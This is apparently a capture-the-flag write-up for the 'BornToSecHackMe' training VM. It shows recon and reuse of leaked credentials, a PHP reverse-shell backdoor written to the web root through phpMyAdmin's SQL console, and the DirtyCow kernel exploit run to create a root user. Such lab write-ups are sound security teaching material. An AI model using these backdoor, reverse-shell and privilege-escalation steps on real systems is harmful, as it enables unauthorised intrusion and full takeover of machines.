# Writeup2 - DirtyC0w
# Recon
## Scans
### Scan network to detect the VM IP

To investigate the VM we will first need to find its IP.    

As we are connected to the same network interface (en0) as the VM, 
we can scan the network for available hosts using nmap.

```
$> nmap -sn -PE -v INTERFACE_IP/24
...
Nmap scan report for 192.168.1.239 [host down]
Nmap scan report for 192.168.1.240 [host down]
Nmap scan report for BornToSecHackMe (192.168.1.241)
Host is up (0.0029s latency).
Nmap scan report for Ordi-De-Moi (192.168.1.242)
Host is up (0.0028s latency).
Nmap scan report for 192.168.1.243 [host down]
Nmap scan report for 192.168.1.244 [host down]
Nmap scan report for 192.168.1.245 [host down]
...
```

In our case, the VM DNS name is `BornToSecHackMe` and its IP is: `192.168.1.241`

---------------

### Service discovery
Now that we have the machine's IP, we can use nmap another time to scan services that
might run on it
```
$> sudo nmap -O -sV BornToSecHackMe
...
Not shown: 994 closed ports
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.0.8 or later
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
143/tcp open  imap     Dovecot imapd
443/tcp open  ssl/ssl  Apache httpd (SSL-only mode)
993/tcp open  ssl/imap Dovecot imapd
MAC Address: 08:00:27:37:26:C5 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.16
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
```

We have successfuly found a collection of services that may be used as entrypoints.

---------------

### Scanning the website 

To make the first recon of the website we chose to use `nikto`.

```
$> nikto -host https://BornToSecHackMe
- Nikto v2.1.6
...
+ Server: Apache/2.2.22 (Ubuntu)
...
+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.20
...
+ OSVDB-3092: /forum/: This might be interesting...
...
+ OSVDB-3093: /webmail/src/read_body.php: SquirrelMail found
...
+ /phpmyadmin/: phpMyAdmin directory found
...
```

We have found an Apache server with a php server that serves phpmyadmin, a forum and a webmail application.



# Penetration


## Web site
We access the webserver with a web browser at this [URL:](https://BornToSecHackMe/) to read the webpage.   

---------------

### MyLittleForum (/forum)

Here we can notify some things:
- This forum is powered by MyLittleForum
- There are some posts
- There is a user list

One post posted by the user lmezard contains connection logs. In these, we can find a password typed by error in the username field :
```
!q\]Ej?*5K5cy*AJ
```

We then tried to login on the forum as lmezard with the precedent password and it worked successfully, Victory !

Here we can get her email `laurie@borntosec.net` in her profile section.

---------------

### SquirelMail (/webmail/src/index.php)

Now that we have got an email and a password from an user of the forum, we tried to login with those on the webmail page and again it worked like a charm ! 

We then found an interesting mail concerning database access that gave us those credentials :
```
user: root 
password: Fg-'kKXBj87E:aJ$
```
We can then try to connect to phpmyadmin using those.

---------------

### PhpMyAdmin (/phpmyadmin)

On the phpmyadmin page we are now logged in as root !

We now have the possiblity to send SQL requests via the webpage, so we can try to write a file into the webserver's machine, but we need to find a place to write it with our current permissions. Luckily, MyLittleForum exposes a read and write access directory at `/forum/templates_c`, we can then suppose that the forum will be installed in `/var/www/` and try to write the file to `/var/www/forum/templates_c/`.

We used this php script to create a backdoor that will connect back to our listener when executed :
```php
<?php
    $sock=fsockopen("OUR_LISTENER_IP", OUR_LISTENER_PORT);
    $proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

We then injected it using this script on the phpmyadmin sql console:
```sql
SELECT "<?php $sock=fsockopen('OUR_LISTENER_IP',OUR_LISTENER_PORT);$proc=proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>"
into outfile "/var/www/forum/templates_c/backdoor.php";
```


We started a listener using netcat, then searched the page [https://BornToSecHackMe/forum/templates_c/backdoor.php](https://BornToSecHackMe/forum/templates_c/backdoor.php) :
```
$> nc -lk OUR_LISTENER_IP OUR_LISTENER_PORT
www-data@BornToSecHackMe:/var/www/forum/templates_c $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@BornToSecHackMe:/var/www/forum/templates_c $
```


---------------

### Stabilize shell
```bash
$> python -c 'import pty; pty.spawn("/bin/bash")'
```

That's enought to run some command like su or sudo but if you want an even better shell add thoose commands:
```bash
$> export TERM=xterm
```
This will give us access to term commands such as clear.
`Ctrl + Z` Back in our own terminal then use
```bash
$> stty raw -echo; fg
```
And there you have it ! a beautiful stabilized shell !

# Dirty c0w

Download an exploit for the dirtycow vulnerability. From example you can use [this one](https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c)

```
laurie@BornToSecHackMe:~$ curl -fSSl https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c -o dirty.c
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  4815  100  4815    0     0  75340      0 --:--:-- --:--:-- --:--:--  106k
```

Then compile it and execute it:    

```
laurie@BornToSecHackMe:~$ gcc -pthread dirty.c -o dirty -lcrypt
laurie@BornToSecHackMe:~$ ./dirty rootpass
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: rootpass
Complete line:
firefart:fiHwdmNrQMchY:0:0:pwned:/root:/bin/bash

mmap: b7fda000

madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'rootpass'.

DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'rootpass'.

DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
laurie@BornToSecHackMe:~$
```

In the file `/etc/passwd` we should now see a new user called `firefart` with a UID 0.
```
laurie@BornToSecHackMe:~$ cat /etc/passwd
firefart:fiHwdmNrQMchY:0:0:pwned:/root:/bin/bash
/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
[...]
```

Connect as firefart :
```
$> laurie@BornToSecHackMe:~$ su firefart
Password:
firefart@BornToSecHackMe:/home/laurie# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@BornToSecHackMe:/home/laurie#
```

You now have a root shell available !!